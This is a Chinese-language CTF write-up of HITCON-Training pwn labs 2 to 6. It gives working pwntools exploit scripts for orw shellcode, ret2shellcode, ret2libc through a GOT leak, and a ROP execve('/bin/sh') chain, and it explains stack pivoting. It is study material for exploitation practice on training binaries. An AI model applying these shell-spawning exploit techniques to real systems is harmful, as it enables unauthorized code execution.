---
title: hitcon pwn writeUp
date: 2019-04-17 14:45:00
tags: CTF
---

[HITCON pwn](https://github.com/scwuaptx/HITCON-Training)练习

### lab2

这一题是直接让你输入shellcode然后程序就去执行你的shellcode，但正如这道题的名字orw，获取flag的方法是用open,read,write三个syscall来完成的。

##### prctl( int **option**,unsigned long arg2,……)

这个系统调用指令是为进程制定而设计的，明确的选择取决于option。通过`man prctl`可以查看该函数说明。

![使用到了option 38和22](C:\Users\asus\spidermana.github.io\assets\img\hitonlab22.png)

option 38/22：

`#define PR_SET_NO_NEW_PRIVS	38`：当一个进程或其子进程设置了PR_SET_NO_NEW_PRIVS 属性,则其不能访问一些无法share的操作,如setuid, 和chroot【总之就是不能让你提高权限】

`#define PR_GET_SECCOMP	21`: set process seccomp【secure computing】 mode ，这个模式限制了你能使用的系统调用。根据参数设置，只能想办法使用open,read,write这三个syscall来cat flag。

![反编译情况](C:\Users\asus\spidermana.github.io\assets\img\hitonlab21.png)

##### system call

- int 0x80的输入输出参数说明：
  - 输入参数：%eax＝功能号
  -  %ebx，%ecx，%edx，%esx，%edi为参数
  - 功能号：exit(1)/fork(2)/read(3)/write(4)/open(5)
  - 其他详见：https://blog.csdn.net/xiaominthere/article/details/17287965

```python
#exp如下
#fp = open("flag",0)
#read(fp,buf,0x30)
#write(1,buf,0x30)
#通过汇编语言完成上述语句
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
bin = ELF('orw.bin')
cn = process('./orw.bin')

cn.recv()
#注意shellcode asm后不能有0x00，否则会在read()时被截断
shellcode='''
push 1; #push 1，0x00000001位于栈顶，esp处
dec byte ptr [esp]; #BYTE PTR [esp]表示[esp]处一个字节，dec表示减1，
push 0x67616c66;  #此时栈顶为0x00000000，push “flag”，得到flag\0
mov ebx,esp;  #ebx=flag的地址
xor ecx,ecx;  #清空,ecx=0
xor edx,edx;  
xor eax,eax;  
mov al,0x5; #open
int 0x80;  #

mov ebx,eax; #eax中存储了返回值fp
xor eax,eax;
mov al,0x3;  #read
mov ecx,esp; #&buf
mov dl,0x30;
int 0x80;

mov al,0x4;   #write
mov bl,1;
mov dl,0x30;
int 0x80;
'''

#gdb.attach(cn)
#raw_input()
cn.sendline(asm(shellcode)) #write到终端
cn.interactive()

```

### lab3

![hitconlab32](C:\Users\asus\spidermana.github.io\assets\img\hitconlab32.png)

没有canary，还有rwx。

反汇编源文件，可知有栈溢出点，同时输入存储到&name中，name处于bss段

![hitconlab31](C:\Users\asus\spidermana.github.io\assets\img\hitconlab31.png)

在gdb中run ret2sc文件【file ret2sc—b main—vmmap】，vmmap得到如下结果。

name所在的bss段，在vmmap结果中可以看到rwx

![hitconlab33](C:\Users\asus\spidermana.github.io\assets\img\hitconlab33.png)

**exp：**通过read(&name)写入shellcode+gets(&s)栈溢出，ret到bss段首。

但是这里有一点要注意，看汇编可以知道，他这里是使用esp寄存器传参的。

比如read函数第一个参数在[esp]、第二个参数在[esp+4]、第三个参数[esp+8]。

【平常一般是push参数1，push 参数2……】

![1555491006628](C:\Users\asus\AppData\Roaming\Typora\typora-user-images\1555491006628.png)

因此<u>计算padding的时候对于char s; // [esp+1Ch] [ebp-14h]，要用 [esp+1Ch]</u> 。设置'a'\*0x1c+'bbbb'而非‘a’\*0x14+'bbbb'。

```python
from pwn import *
context.log_level="debug"
re = ELF("ret2sc")

cn = process("./ret2sc")

cn.recv()
cn.sendline(asm(shellcraft.linux.sh()))

cn.recv()

name_addr = 0x0804A060
payload = 'a'*0x1c+'bbbb'+p32(name_addr)
cn.sendline(payload)
cn.interactive()
```

### lab4

分析源码可知，see_something可以提供传入一个地址字符串，打印该地址字符串所存储的内容，%p打印了16进制地址【泄露got表】，由于只有libc中的read被调用过，因此泄露elf.got['read']中存储的地址即read的真实地址

在Print_message中存在栈溢出漏洞，main中read(0, &src, **0x100u**);而Print_message中strcpy(&dest, src);中char dest; // [esp+10h] **[ebp-38h]**。

**exp：**泄露read对应的got表项，得到read函数的真实地址，从而得到system和/bin/sh的真实地址，通过栈溢出，执行system("/bin/sh")

```python
from pwn import *
context.log_level='debug'

libc = ELF("./libc.so")
elf = ELF('ret2lib')
re =process('./ret2lib')

re.recvuntil("(in dec) :")
read_got = elf.got['read'] #10进制read got表项地址
payload1= str(read_got)
re.sendline(payload1)
#将16进制str【不含0x】按16进制解析变成10进制数值
read_addr =  int(re.recv()[-8:-1],16)
print "func read addr = ",read_addr
recvuntil("for me :")
sys_addr = read_addr - libc.symbols['read']+ libc.symbols['system']
binsh_addr = read_addr - libc.symbols['read']+libc.search('/bin/sh').next()
#注意/bin/sh通过libc.search('/bin/sh').next()获得libc中的偏移
payload2='a'*0x38+'bbbb'+p32(sys_addr)+'bbbb'+p32(binsh_addr)
re.sendline(padload2)
re.interactive()
```

注：strtol(&buf, v3, v4)：实现将字符串转化成长整形，v4指定进制，v3指定终止条件或字符，buf提供要转化成long long的字符串。

### lab5

这一题提示了你要用ROP。

回顾一下IDA快捷键：

- g快速跳转到某一个地址
- alt+T：搜索string
- shift+f12：查看字符串
- ctrl+s：定位各个段
- alt+B：二进制搜索【hex view中】
  - 本题的int 80h系统调用，可以alt+b搜索`80CD`得到
  - CD 80为int 80h的二进制编码【0x80在高地址，0xCD在低地址】

![](C:\Users\asus\spidermana.github.io\assets\img\hitconlab41.png)

![](C:\Users\asus\spidermana.github.io\assets\img\hitconlab43.png)

![](C:\Users\asus\spidermana.github.io\assets\img\hitconlab42.png)

本题通过shift+f12查看全局字符串并没有看到/bin/sh或者system函数等

**exp：**因此通过read函数将/bin/sh写入bss段【re.bss()】，再通过int 80调用execve函数【功能号=11=0xb】

通过`ROPgadget --binary simplerop --only "pop|ret"`得到ROP链

```python
from pwn import *
from struct import pack
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
bin = ELF('simplerop')

cn = process('./simplerop')

cn.recv()

p_read = 0x0806CD50
p_eax_ret = 0x080bae06
p_edx_ecx_ebx_ret = 0x0806e850
int_80 = 0x80493e1
# Padding goes here
p = ''
p += 'a'*0x1c + 'bbbb'
p += p32(p_read) + p32(p_edx_ecx_ebx_ret) + p32(0) + p32(bin.bss()) + p32(0x10) #read(0,bss首地址,0x10), ret到rop链，pop掉栈上的参数
p += p32(p_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin.bss())
p += p32(p_eax_ret) + p32(0xb) #ebx=/bin/sh str地址
p += p32(int_80) # int 0x80 ，功能号eax=0xb 。得到execve("/bin/sh")
print hex(len(p))

cn.sendline(p)
cn.sendline('/bin/sh\0')  
cn.interactive()
```

### lab6

栈迁移：主要是为了解决栈溢出可以溢出空间大小不足的问题。

什么时候栈溢出空间不足呢？就是要用到的ROP链很长，参数很多的时候。而在栈上写入的字符串长度受限【read(0,&buf,0x40)，0x40不够】。

这时候有两种办法：

- 多次利用栈溢出漏洞：反复触发某个函数的漏洞，触发一次做一件事情，触发多次完成多件，而不是一次溢出全做好【这要求栈可溢出空间充足】。
  - 如果溢出一次的空间都做不了，那么这种方法可能无效
  - 或者不允许反复触发漏洞【如下这种情况】
- 栈迁移：将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上，使得栈可溢出“空间变大”。

```python
leave_ret相当于：
mov %ebp,%esp【左->右】
pop %ebp
pop %eip
#esp被ebp赋值
```





参考：https://blog.csdn.net/zszcr/article/details/79841848

总结：栈迁移是再写入空间不够的时候，通过leave_ret这类收尾的代码来把ebp和esp改到某个地址固定的位置，通过控制ret的地址和ebp指针向我们指定的位置写值，通常是一段不完整的rop代码，通过不断迁移把rop代码一段一段的写完，最后通过leave_ret到rop代码上面4字节（x86）来实现rop的调用。